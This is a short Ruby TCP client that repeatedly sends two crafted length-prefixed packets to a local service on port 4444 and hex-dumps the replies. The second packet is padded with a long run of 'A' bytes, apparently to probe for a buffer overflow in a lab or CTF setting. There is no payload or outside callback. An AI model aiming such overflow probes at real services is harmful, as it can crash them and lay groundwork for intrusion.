#!/usr/bin/env ruby
require 'hexdump'
require 'socket'


class TargetClient
    
    def initialize(opts={})
        @server = opts[:server] ? opts[:server] : '127.0.0.1'
        @port   = opts[:port] ? opts[:port] : 4444
        @socket = nil
    end
    
    # 
    def client_packet_1
        %Q{0000001024004141414141414141414141414141}.scan(/../).map{|b| b.hex}.pack("C*")
    end

    def client_packet_2
        %Q{000000ff240041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141}.scan(/../).map{|b| b.hex}.pack("C*")
    end


    def connect
        @socket = TCPSocket.new(@server, @port)
        while true
            @socket.write client_packet_1
            handle(@socket)
            sleep 2.0
            
            @socket.write client_packet_2
            handle(@socket)
            sleep 2.0
        end
    end
    
    def handle(server)
            payload_length = server.read(4).unpack("N")[0]
            printf("Server response payload_length 0x%08x\n", payload_length)
            pkt = server.read(payload_length)
            Hexdump.dump pkt
            
            # parse stuff here
            
            return
    end
    
end

client = TargetClient.new
client.connect